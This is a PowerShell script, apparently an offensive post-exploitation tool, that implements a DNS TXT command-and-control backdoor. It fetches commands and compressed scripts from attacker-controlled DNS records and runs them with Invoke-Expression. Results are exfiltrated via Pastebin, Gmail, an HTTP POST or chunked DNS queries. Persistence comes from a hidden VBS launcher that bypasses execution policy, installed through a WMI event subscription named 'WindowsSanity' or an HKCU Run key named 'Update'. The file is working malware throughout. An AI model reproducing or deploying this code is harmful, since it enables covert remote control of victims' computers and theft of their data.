function DNS_TXT_Pwnage
{
    [CmdletBinding(DefaultParameterSetName="noexfil")] Param(
        [Parameter(Parametersetname="exfil")]
        [Switch]
        $persist,
        [Parameter(Parametersetname="exfil")]
        [Switch]
        $exfil,
        [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $startdomain,
        [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $cmdstring,
        [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $commanddomain,
        [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $psstring,
        [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 4, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $psdomain,
        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")]
        [Parameter(Position = 5, Mandatory = $False, Parametersetname="noexfil")]
        [String]
        $Arguments = "Out-Null",
        [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 6, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $Subdomains,
        [Parameter(Position = 7, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 7, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $StopString,
        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
        [Parameter(Position = 8, Mandatory = $False, Parametersetname="noexfil")]
        [String]$AuthNS,    
        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
        [String]
        $ExfilOption,
        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $dev_key = "null",
        [Parameter(Position = 11, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $username = "null",
        [Parameter(Position = 12, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $password = "null",
        [Parameter(Position = 13, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $URL = "null",
        [Parameter(Position = 14, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $DomainName = "null",
        [Parameter(Position = 15, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $ExfilNS = "null"
   )
    $body = @'    
function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $psdomain, $Arguments, $Stopstring, $AuthNS, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $ExfilNS, $exfil)
{
    while($true)
    {
        $exec = 0
        start-sleep -seconds 5
        if ($AuthNS -ne $null)
        {
            $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain $AuthNS") 
        }
        else
        {
            $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain") 
        }
        $tmp = $getcode | select-string -pattern "`""
        $startcode = $tmp -split("`"")[0]
        if ($startcode[1] -eq $cmdstring)
        {
            start-sleep -seconds 5
            if ($AuthNS -ne $null)
            {
                $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain $AuthNS") 
            }
            else
            {
                $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain") 
            }
            $temp = $getcommand | select-string -pattern "`""
            $command = $temp -split("`"")[0]
            $pastevalue = Invoke-Expression $command[1]
            $pastevalue
            $exec++
            if ($exfil -eq $True)
            {
                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
                Do-Exfiltration-Dns "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
            }
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }
        }
        if ($startcode[1] -match $psstring)
        {
            $i = 1
            while ($i -le $subdomains)
            {
                if ($AuthNS -ne $null)
                {
                    $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain $AuthNS")
                }
                else
                {
                    $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain") 
                }
                $temp = $getcommand | select-string -pattern "`""
                $tmp1 = ""
                $tmp1 = $tmp1 + $temp
                $encdata = $encdata + $tmp1 -replace '\s+', "" -replace "`"", ""
                $i++
            }
            $dec = [System.Convert]::FromBase64String($encdata)
            $ms = New-Object System.IO.MemoryStream
            $ms.Write($dec, 0, $dec.Length)
            $ms.Seek(0,0) | Out-Null
            $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
            $sr = New-Object System.IO.StreamReader($cs)
            $command = $sr.readtoend()
            $script:pastevalue = Invoke-Expression $command
            if ($Arguments -ne "Out-Null")
            {
                $pastevalue = Invoke-Expression $Arguments                   
            }
            $pastevalue            
            $exec++
            if ($exfil -eq $True)
            {
                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
                Do-Exfiltration-Dns "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
            }
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }
        }
        if($startcode[1] -eq $StopString)
        {
            break
        }
    }
}
'@
$exfiltration = @'
function Do-Exfiltration-Dns($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$ExfilNS)
{
    function post_http($url,$parameters) 
    { 
        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
        $http_request.open("POST", $url, $false) 
        $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
        $http_request.setRequestHeader("Content-length", $parameters.length); 
        $http_request.setRequestHeader("Connection", "close") 
        $http_request.send($parameters) 
        $script:session_key=$http_request.responseText
        Write-Verbose $session_key
    } 
    function Compress-Encode
    {
        $ms = New-Object IO.MemoryStream
        $action = [IO.Compression.CompressionMode]::Compress
        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
        $pastevalue | ForEach-Object {$sw.WriteLine($_)}
        $sw.Close()
        $code = [Convert]::ToBase64String($ms.ToArray())
        return $code
    }
    if ($exfiloption -eq "pastebin")
    {
        $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
        $pastevalue = [System.Convert]::ToBase64String($utfbytes)
        post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
        post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
    }
    elseif ($exfiloption -eq "gmail")
    {
        $smtpserver = "smtp.gmail.com"
        $msg = new-object Net.Mail.MailMessage
        $smtp = new-object Net.Mail.SmtpClient($smtpServer )
        $smtp.EnableSsl = $True
        $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
        $msg.From = "$username@gmail.com"
        $msg.To.Add("$username@gmail.com")
        $msg.Subject = $pastename
        $msg.Body = $pastevalue
        if ($filename)
        {
            $att = new-object Net.Mail.Attachment($filename)
            $msg.Attachments.Add($att)
        }
        $smtp.Send($msg)
    }
    elseif ($exfiloption -eq "webserver")
    {
        $Data = Compress-Encode    
        post_http $URL $Data
    }
    elseif ($ExfilOption -eq "DNS")
    {
        $lengthofsubstr = 0
        $code = Compress-Encode
        $queries = [int]($code.Length/63)
        while ($queries -ne 0)
        {
            $querystring = $code.Substring($lengthofsubstr,63)
            Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $ExfilNS"
            $lengthofsubstr += 63
            $queries -= 1
        }
        $mod = $code.Length%63
        $query = $code.Substring($code.Length - $mod, $mod)
        Invoke-Expression "nslookup -querytype=txt $query.$DomainName $ExfilNS"
    }
}
'@
    $modulename = "DNS_TXT_Pwnage.ps1"
    if($persist -eq $True)
    {
        $name = "persist.vbs"
        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Arguments $Stopstring $AuthNS"
        if ($exfil -eq $True)
        {
            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Arguments $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil"
        }
        Out-File -InputObject $body -Force $env:TEMP\$modulename
        Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
        Out-File -InputObject $options -Append $env:TEMP\$modulename
        echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
        echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
        {
            $scriptpath = $env:TEMP
            $scriptFileName = "$scriptpath\$name"
            $filterNS = "root\cimv2"
            $wmiNS = "root\subscription"
            $query = @"
             Select * from __InstanceCreationEvent within 30 
             where targetInstance isa 'Win32_LogonSession' 
"@
            $filterName = "WindowsSanity"
            $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
            $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name="WindowsSanity"; ScriptFileName=$scriptFileName; ScriptingEngine="VBScript"}
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
        }
        else
        {
            New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
            echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
            echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
        }
    }
    else
    {
        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Arguments $Stopstring $AuthNS $LoadFuntion"
        if ($exfil -eq $True)
        {
            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Arguments $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil $LoadFunction"
        }
        Out-File -InputObject $body -Force $env:TEMP\$modulename
        Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
        Out-File -InputObject $options -Append $env:TEMP\$modulename
        Invoke-Expression $env:TEMP\$modulename     
    }
}
